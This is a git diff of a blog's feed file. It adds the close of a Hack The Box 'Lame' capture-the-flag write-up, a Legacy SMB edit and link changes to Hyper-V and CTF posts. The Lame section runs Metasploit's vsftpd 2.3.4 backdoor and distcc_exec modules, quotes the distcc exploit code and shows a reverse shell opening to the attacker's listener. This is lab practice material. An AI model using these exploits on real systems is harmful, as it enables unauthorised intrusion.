+&lt;p&gt;Sweet. We were able to find both the root and the user flags. This is realllly done. But.. before we wrap up, there was quite a bit of other vulnerabilities and CVEs right? I’m curious to see what we can do with those heckin cuties.&lt;/p&gt;
+
+&lt;h1 id=&quot;other-vulns&quot;&gt;Other Vulns&lt;/h1&gt;
+
+&lt;p&gt;Let’s check the FTP stuff first. Search for it in Metasploit real quick and you’ll find something worth poking at.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/unix/ftp/vsftpd_234_backdoor
+ msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; show targets
+ 
+ Exploit targets:
+ 
+ Id  Name
+ --  ----
+ 0   Automatic
+ 
+ 
+ msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; options
+ 
+ Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+ 
+ Name    Current Setting  Required  Description
+ ----    ---------------  --------  -----------
+ RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
+ RPORT   21               yes       The target port (TCP)
+ 
+ 
+ Exploit target:
+ 
+ Id  Name
+ --  ----
+ 0   Automatic
+ 
+ 
+ msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; set rhosts 10.10.10.3
+ rhosts =&amp;gt; 10.10.10.3
+ msf5 exploit(unix/ftp/vsftpd_234_backdoor) &amp;gt; run
+ 
+ [*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
+ [*] 10.10.10.3:21 - USER: 331 Please specify the password.
+ [*] Exploit completed, but no session was created.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;It doesn’t do much but let you know you need a password. So let’s hit the books on this one.&lt;/p&gt;
+&lt;h2 id=&quot;manual-exploit&quot;&gt;Manual exploit&lt;/h2&gt;
+
+&lt;p&gt;After doing some Googlefu I found a manual exploit for vsFTPd 2.3.4 - connecting to the ftp and placing a : and ) into the USER field triggers opening port 6200&lt;/p&gt;
+
+&lt;p&gt;Manual exploit references.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://mkirbypn.wordpress.com/2016/02/23/exploit-vstftpd-version-2-3-4/&quot;&gt;Exploit vsftpd version 2.3.4&lt;/a&gt;  &lt;br /&gt;
+&lt;a href=&quot;https://charlesreid1.com/wiki/Metasploitable/VSFTP&quot;&gt;Another reference writeup&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/ftpExploit.png&quot; alt=&quot;FTP Exploit&quot; /&gt;    &lt;br /&gt;
+Weird. Okay. So it opens a new port. From reading about this exploit, the 6200 port should allow us to telnet to it and get a shell. I wasn’t successful at getting a shell this way.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/telnet6200.png&quot; alt=&quot;telnet6200&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pretty interesting either way. Still a vulnerability even if I couldn’t manage to get it working!&lt;/p&gt;
+
+&lt;h2 id=&quot;distcc-metasploit-exploit&quot;&gt;DistCC Metasploit exploit&lt;/h2&gt;
+
+&lt;p&gt;Next on our list is this curious DistCC port that is open. We saw from our scan that there is a CVE on it. &lt;strong&gt;CVE:CVE-2004-2687&lt;/strong&gt;. Let’s try finding something with our highly technical Googling powers and then on Metasploit. &lt;br /&gt;
+&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2004-2687&quot;&gt;Nist.gov CVE information&lt;/a&gt; &lt;br /&gt;
+&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687&quot;&gt;Mitre.org CVE information&lt;/a&gt;  &lt;br /&gt;
+&lt;a href=&quot;https://www.exploit-db.com/exploits/9915&quot;&gt;Exploit DB - The Metasploit module&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Seems like this protocol is used to compile things over the network, and has a flaw that allows us to spit some things at it that gives us a shell.&lt;/p&gt;
+
+&lt;p&gt;The meat of the exploit is simple. Here is a snippet.&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dist_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+		&lt;span class=&quot;c1&quot;&gt;# Convince distccd that this is a compile&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sx&quot;&gt;%w{# -c main.c -o main.o}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+		&lt;span class=&quot;c1&quot;&gt;# Set distcc 'magic fairy dust' and argument count&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DIST00000001&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ARGC%.8x&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+		&lt;span class=&quot;c1&quot;&gt;# Set the command arguments&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ARGV%.8x%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Basically just asking it to compile a shell. Okay okay. summplee.&lt;/p&gt;
+
+&lt;p&gt;Let’s try just poking at it using the Metasploit module.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/distcc.png&quot; alt=&quot;distccExploit&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I had to set a payload for this. Setting the options were easy.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/unix/misc/distcc_exec
+msf5 exploit(unix/misc/distcc_exec) &amp;gt; options
+
+Module options (exploit/unix/misc/distcc_exec):
+
+Name    Current Setting  Required  Description
+----    ---------------  --------  -----------
+RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
+RPORT   3632             yes       The target port (TCP)
+
+Exploit target:
+
+Id  Name
+--  ----
+0   Automatic Target
+
+msf5 exploit(unix/misc/distcc_exec) &amp;gt; set rhosts 10.10.10.3
+rhosts =&amp;gt; 10.10.10.3
+msf5 exploit(unix/misc/distcc_exec) &amp;gt; show targets
+
+Exploit targets:
+
+Id  Name
+--  ----
+0   Automatic Target
+
+msf5 exploit(unix/misc/distcc_exec) &amp;gt; set payload cmd/unix/reverse
+payload =&amp;gt; cmd/unix/reverse
+
+msf5 exploit(unix/misc/distcc_exec) &amp;gt; run
+
+[*] Started reverse TCP double handler on 10.10.14.17:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo m93VaQ0EKR7SGV6V;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: &quot;m93VaQ0EKR7SGV6V\r\n&quot;
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.14.17:4444 -&amp;gt; 10.10.10.3:46789) at 2020-05-11 23:49:23 -0400
+
+whoami
+daemon
+pwd
+/tmp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Okay well. That’s all I have for this box right now. I might come back and dig into some of this later and add things. Hope this helped and all that jazz.&lt;/p&gt;
+
+&lt;p&gt;Cheers, 
+Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">Alright let’s talk about Lame for a second. Lame is another great box for practicing for the OSCP. This box is similar to the Legacy box in that it’s pretty easy to hop into. It’s CVE focused and as long as you know how to enumerate, then use tools to search and even Google for the CVEs and vulnerabilities then you should be gucci. If this is your first box that is fine, but I would highly recommend checking out Legacy first. Feel free to use my writeup for that one as well.</summary></entry><entry><title type="html">Legacy HTB Writeup</title><link href="http://hiimzackjones.github.io/infosec/2020/05/15/Legacy-HTB-Writeup.html" rel="alternate" type="text/html" title="Legacy HTB Writeup" /><published>2020-05-15T18:00:00-04:00</published><updated>2020-05-15T18:00:00-04:00</updated><id>http://hiimzackjones.github.io/infosec/2020/05/15/Legacy-HTB-Writeup</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2020/05/15/Legacy-HTB-Writeup.html">&lt;p&gt;The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/Website_shot.png&quot; alt=&quot;Website Screenshot&quot; /&gt;&lt;/p&gt;
 
@@ -155,9 +657,17 @@ smbclient -N -L \\\10.10.10.4\\
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/smbclient.png&quot; alt=&quot;smbclient&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;We aren’t getting much from it right now and that’s okay. Let’s keep poking around.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;EDIT&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;em&gt;Note: smbmap is also a great tool for enumerating SMB, in paticular when working with Active Directory or domains.&lt;/em&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Alright so. When I wrote this post I didn’t realize what this error was coming from. After doing some research I realized that my .conf file that handles smb client was configured to run a newer version of SMB. So, if you run into this, I have a quick writeup on how to fix it &lt;a href=&quot;/linux/2020/09/30/SMB-Enumeration-Issue-Fix.html&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/smbclientupdated.png&quot; alt=&quot;SMBclientUpdated&quot; /&gt;&lt;/p&gt;
+
+  &lt;p&gt;After changing the conf file. This is what it looked like. To be expected. Invalid parameter means it doesn’t like a blank password.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;em&gt;smbmap is also a great tool for enumerating SMB, in paticular when working with Active Directory or domains.&lt;/em&gt;&lt;/p&gt;
 
 &lt;p&gt;Another way to enumerate SMB is to use nmap with the SMB script. We have already done this in the big nmap scan we did previously, but if you wanted to run it again it would look like this.&lt;/p&gt;
 
@@ -331,7 +841,7 @@ meterpreter &amp;gt;
  Email is &lt;strong&gt;hi.imzackjones@gmail.com&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;Cheers, 
-Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.</summary></entry><entry><title type="html">Necromancer VulnHub Class Exercise</title><link href="http://localhost:4000/infosec/2019/02/02/Necromancer-VulnHub-Writeup.html" rel="alternate" type="text/html" title="Necromancer VulnHub Class Exercise" /><published>2019-02-02T08:16:00-05:00</published><updated>2019-02-02T08:16:00-05:00</updated><id>http://localhost:4000/infosec/2019/02/02/Necromancer-VulnHub-Writeup</id><content type="html" xml:base="http://localhost:4000/infosec/2019/02/02/Necromancer-VulnHub-Writeup.html">&lt;h2 id=&quot;necromancer-notes&quot;&gt;Necromancer Notes&lt;/h2&gt;
+Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.</summary></entry><entry><title type="html">Necromancer VulnHub Class Exercise</title><link href="http://hiimzackjones.github.io/infosec/2019/02/02/Necromancer-VulnHub-Writeup.html" rel="alternate" type="text/html" title="Necromancer VulnHub Class Exercise" /><published>2019-02-02T08:16:00-05:00</published><updated>2019-02-02T08:16:00-05:00</updated><id>http://hiimzackjones.github.io/infosec/2019/02/02/Necromancer-VulnHub-Writeup</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2019/02/02/Necromancer-VulnHub-Writeup.html">&lt;h2 id=&quot;necromancer-notes&quot;&gt;Necromancer Notes&lt;/h2&gt;
 &lt;h5 id=&quot;made-for-intro-for-cyber-security-class-taught-spring-2019&quot;&gt;Made for Intro for Cyber Security Class taught Spring 2019.&lt;/h5&gt;
 
 &lt;p&gt;Necromancer is a CTF that can be downloaded and ran on a virtual environment such as VirtualBox, VMWare, Hyper-V.  &lt;a href=&quot;https://www.vulnhub.com/entry/the-necromancer-1,154/&quot;&gt;https://www.vulnhub.com/entry/the-necromancer-1,154/&lt;/a&gt;&lt;/p&gt;
@@ -449,7 +959,7 @@ The -sP scan means just pinging machines. Note: Some machines may not respond to
 
 &lt;h4 id=&quot;video-ends-here&quot;&gt;Video ends here.&lt;/h4&gt;
 
-&lt;p&gt;We can assume that the &lt;code&gt;/amagicbridgeappearsatthechasm&lt;/code&gt; is possibly a directory. Try going to the site by typing the host’s IP address and then going to the url. From there use your Web pentesting notes to search through possible directories, check pages that are hidden from Google’s web crawlers, test to see if it’s running off of Wordpress, etc. Take screenshots of your findings.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">Necromancer Notes Made for Intro for Cyber Security Class taught Spring 2019.</summary></entry><entry><title type="html">NCL Gym Exploitation ‘Python 2’</title><link href="http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2.html" rel="alternate" type="text/html" title="NCL Gym Exploitation ‘Python 2’" /><published>2018-04-02T21:13:00-04:00</published><updated>2018-04-02T21:13:00-04:00</updated><id>http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2</id><content type="html" xml:base="http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2.html">&lt;p&gt;So this challenge at first glance was intimidating. There was a bit more going on in this one. But always, always, always - code looks scarier than it actually is. But before we get into the code. The download was a .pyc file.&lt;/p&gt;
+&lt;p&gt;We can assume that the &lt;code&gt;/amagicbridgeappearsatthechasm&lt;/code&gt; is possibly a directory. Try going to the site by typing the host’s IP address and then going to the url. From there use your Web pentesting notes to search through possible directories, check pages that are hidden from Google’s web crawlers, test to see if it’s running off of Wordpress, etc. Take screenshots of your findings.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">Necromancer Notes Made for Intro for Cyber Security Class taught Spring 2019.</summary></entry><entry><title type="html">NCL Gym Exploitation ‘Python 2’</title><link href="http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2.html" rel="alternate" type="text/html" title="NCL Gym Exploitation ‘Python 2’" /><published>2018-04-02T21:13:00-04:00</published><updated>2018-04-02T21:13:00-04:00</updated><id>http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2.html">&lt;p&gt;So this challenge at first glance was intimidating. There was a bit more going on in this one. But always, always, always - code looks scarier than it actually is. But before we get into the code. The download was a .pyc file.&lt;/p&gt;
 
 &lt;p&gt;Wut.&lt;/p&gt;
 
@@ -758,7 +1268,7 @@ correct
 
 &lt;p&gt;-Cheers&lt;/p&gt;
 
-&lt;p&gt;Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">So this challenge at first glance was intimidating. There was a bit more going on in this one. But always, always, always - code looks scarier than it actually is. But before we get into the code. The download was a .pyc file.</summary></entry><entry><title type="html">NCL Gym Exploitation ‘Python 1’</title><link href="http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1.html" rel="alternate" type="text/html" title="NCL Gym Exploitation ‘Python 1’" /><published>2018-04-02T18:33:00-04:00</published><updated>2018-04-02T18:33:00-04:00</updated><id>http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1</id><content type="html" xml:base="http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1.html">&lt;h1 id=&quot;ncl-gym-2018---enumeration-and-exploitation-python-1&quot;&gt;NCL Gym 2018 - Enumeration and Exploitation Python 1&lt;/h1&gt;
+&lt;p&gt;Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">So this challenge at first glance was intimidating. There was a bit more going on in this one. But always, always, always - code looks scarier than it actually is. But before we get into the code. The download was a .pyc file.</summary></entry><entry><title type="html">NCL Gym Exploitation ‘Python 1’</title><link href="http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1.html" rel="alternate" type="text/html" title="NCL Gym Exploitation ‘Python 1’" /><published>2018-04-02T18:33:00-04:00</published><updated>2018-04-02T18:33:00-04:00</updated><id>http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON1.html">&lt;h1 id=&quot;ncl-gym-2018---enumeration-and-exploitation-python-1&quot;&gt;NCL Gym 2018 - Enumeration and Exploitation Python 1&lt;/h1&gt;
 
 &lt;p&gt;This flag is a Python password flag. Figure out what the password should be to satisfy the if statement. Easy.&lt;/p&gt;
 
@@ -1024,7 +1534,7 @@ correct
 
 &lt;p&gt;Cheers,&lt;/p&gt;
 
-&lt;p&gt;Zack&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">NCL Gym 2018 - Enumeration and Exploitation Python 1</summary></entry><entry><title type="html">Configuring Hyper V Networking</title><link href="http://localhost:4000/server/2018/03/28/Configuring-Hyper-V-Networking.html" rel="alternate" type="text/html" title="Configuring Hyper V Networking" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Configuring-Hyper-V-Networking</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Configuring-Hyper-V-Networking.html">&lt;p&gt;Hyper-V has extensive software defined network capabilities allowing an admin to create elaboriate networking, isolating host VMs, Vlans, Link Aggregation, and Load Balancing.&lt;/p&gt;
+&lt;p&gt;Zack&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">NCL Gym 2018 - Enumeration and Exploitation Python 1</summary></entry><entry><title type="html">Configuring Hyper V Networking</title><link href="http://hiimzackjones.github.io/server/2018/03/28/Configuring-Hyper-V-Networking.html" rel="alternate" type="text/html" title="Configuring Hyper V Networking" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://hiimzackjones.github.io/server/2018/03/28/Configuring-Hyper-V-Networking</id><content type="html" xml:base="http://hiimzackjones.github.io/server/2018/03/28/Configuring-Hyper-V-Networking.html">&lt;p&gt;Hyper-V has extensive software defined network capabilities allowing an admin to create elaboriate networking, isolating host VMs, Vlans, Link Aggregation, and Load Balancing.&lt;/p&gt;
 
 &lt;h3 id=&quot;basic-hyper-v-networking&quot;&gt;Basic Hyper-V Networking&lt;/h3&gt;
 
@@ -1071,7 +1581,7 @@ As you can see, there is a default switch, A switch with a custom name. And then
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/hyperVN/4.PNG&quot; alt=&quot;Nic Teaming&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;That’s the basics!&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Hyper-V has extensive software defined network capabilities allowing an admin to create elaboriate networking, isolating host VMs, Vlans, Link Aggregation, and Load Balancing.</summary></entry><entry><title type="html">Configuring Virtual Machine Settings</title><link href="http://localhost:4000/server/2018/03/28/Configuring-Virtual-Machine-Settings.html" rel="alternate" type="text/html" title="Configuring Virtual Machine Settings" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Configuring-Virtual-Machine-Settings</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Configuring-Virtual-Machine-Settings.html">&lt;h2 id=&quot;setting-hyper-v-settings&quot;&gt;Setting Hyper-V settings&lt;/h2&gt;
+&lt;p&gt;That’s the basics!&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Hyper-V has extensive software defined network capabilities allowing an admin to create elaboriate networking, isolating host VMs, Vlans, Link Aggregation, and Load Balancing.</summary></entry><entry><title type="html">Configuring Virtual Machine Settings</title><link href="http://hiimzackjones.github.io/server/2018/03/28/Configuring-Virtual-Machine-Settings.html" rel="alternate" type="text/html" title="Configuring Virtual Machine Settings" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://hiimzackjones.github.io/server/2018/03/28/Configuring-Virtual-Machine-Settings</id><content type="html" xml:base="http://hiimzackjones.github.io/server/2018/03/28/Configuring-Virtual-Machine-Settings.html">&lt;h2 id=&quot;setting-hyper-v-settings&quot;&gt;Setting Hyper-V settings&lt;/h2&gt;
 
 &lt;p&gt;Hyper-V settings can be adjusted for each VM and will in essence adjust the aspects of the VM that would usually be physical components.&lt;/p&gt;
 
@@ -1105,7 +1615,7 @@ As you can see, there is a default switch, A switch with a custom name. And then
   &lt;li&gt;Automatic start and stop of VM&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/hypervSet/2.PNG&quot; alt=&quot;Management Options&quot; /&gt;&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Setting Hyper-V settings</summary></entry><entry><title type="html">Implementing Failover Clustering</title><link href="http://localhost:4000/server/2018/03/28/Implementing-Failover-Clustering.html" rel="alternate" type="text/html" title="Implementing Failover Clustering" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Implementing-Failover-Clustering</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Implementing-Failover-Clustering.html">&lt;h3 id=&quot;installing-the-failover-feature&quot;&gt;Installing the Failover Feature&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/hypervSet/2.PNG&quot; alt=&quot;Management Options&quot; /&gt;&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Setting Hyper-V settings</summary></entry><entry><title type="html">Implementing Failover Clustering</title><link href="http://hiimzackjones.github.io/server/2018/03/28/Implementing-Failover-Clustering.html" rel="alternate" type="text/html" title="Implementing Failover Clustering" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://hiimzackjones.github.io/server/2018/03/28/Implementing-Failover-Clustering</id><content type="html" xml:base="http://hiimzackjones.github.io/server/2018/03/28/Implementing-Failover-Clustering.html">&lt;h3 id=&quot;installing-the-failover-feature&quot;&gt;Installing the Failover Feature&lt;/h3&gt;
 &lt;p&gt;To add this feature, in Server Manager go to Manage and Add Roles and Features. From the Features list select &lt;em&gt;Failover Clustering&lt;/em&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;validate-cluster-configuration&quot;&gt;Validate Cluster Configuration&lt;/h3&gt;
@@ -1129,206 +1639,4 @@ If there are any issues, use the report to help you sovle them before moving for
 
 &lt;p&gt;Your cluster should show up in the Cluster’s tool section of the Server Manager.&lt;/p&gt;
 
-&lt;h3 id=&quot;adding-a-shared-drive-to-the-cluster-iscsi&quot;&gt;Adding a shared Drive to the Cluster (iSCSI)&lt;/h3&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Installing the Failover Feature To add this feature, in Server Manager go to Manage and Add Roles and Features. From the Features list select Failover Clustering</summary></entry><entry><title type="html">Implementing Networking Load Balancing</title><link href="http://localhost:4000/server/2018/03/28/Implementing-Networking-Load-Balancing.html" rel="alternate" type="text/html" title="Implementing Networking Load Balancing" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Implementing-Networking-Load-Balancing</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Implementing-Networking-Load-Balancing.html">&lt;p&gt;Before you can Implement Network Load Balancing, here are some prerequisites:&lt;/p&gt;
-
-&lt;h3 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;All hosts in the cluster must be on the same subnet&lt;/li&gt;
-  &lt;li&gt;All adapters in cluster must be setup as either &lt;em&gt;multicast&lt;/em&gt; or &lt;em&gt;unicast&lt;/em&gt; but not a mixture of both&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;if unicast&lt;/em&gt; the NIC used to handle client-to-cluster traffic must support changing its MAC address&lt;/li&gt;
-  &lt;li&gt;IPs must be static on the nodes.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;installing-nlb-nodes&quot;&gt;Installing NLB Nodes&lt;/h3&gt;
-&lt;p&gt;Like most other features. You must install this from Server Manager, add roles and features.&lt;/p&gt;
-
-&lt;p&gt;Select &lt;em&gt;Network Load Balancing&lt;/em&gt; from the features section.&lt;/p&gt;
-
-&lt;h3 id=&quot;creating-a-nlb-cluster&quot;&gt;Creating a NLB Cluster&lt;/h3&gt;
-
-&lt;p&gt;Under the Netowkr Load Blancing Manger&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Right click the cluster and click New Cluster&lt;/li&gt;
-  &lt;li&gt;Set the host as your current server&lt;/li&gt;
-  &lt;li&gt;Select the interface for this specific cluster&lt;/li&gt;
-  &lt;li&gt;find the IP address in the Dedicated IP address section and hit next&lt;/li&gt;
-  &lt;li&gt;Add an IP address that is shared by all clusters and it will add the IP to the adapters&lt;/li&gt;
-  &lt;li&gt;add the IP address for the NLB Cluster&lt;/li&gt;
-  &lt;li&gt;On the Cluster Parameters page, type the full internet name for the cluster, and then set operation mode to either Unicast or Multicast, etc.&lt;/li&gt;
-  &lt;li&gt;Set any applicable port rules&lt;/li&gt;
-  &lt;li&gt;Now just add hosts to this cluster as needed.&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Before you can Implement Network Load Balancing, here are some prerequisites:</summary></entry><entry><title type="html">Implementing Server Storage Spaces</title><link href="http://localhost:4000/server/2018/03/28/Implementing-Server-Storage-Spaces.html" rel="alternate" type="text/html" title="Implementing Server Storage Spaces" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Implementing-Server-Storage-Spaces</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Implementing-Server-Storage-Spaces.html">&lt;h3 id=&quot;software-defined-storage--storage-pools&quot;&gt;Software Defined Storage &amp;amp; Storage Pools&lt;/h3&gt;
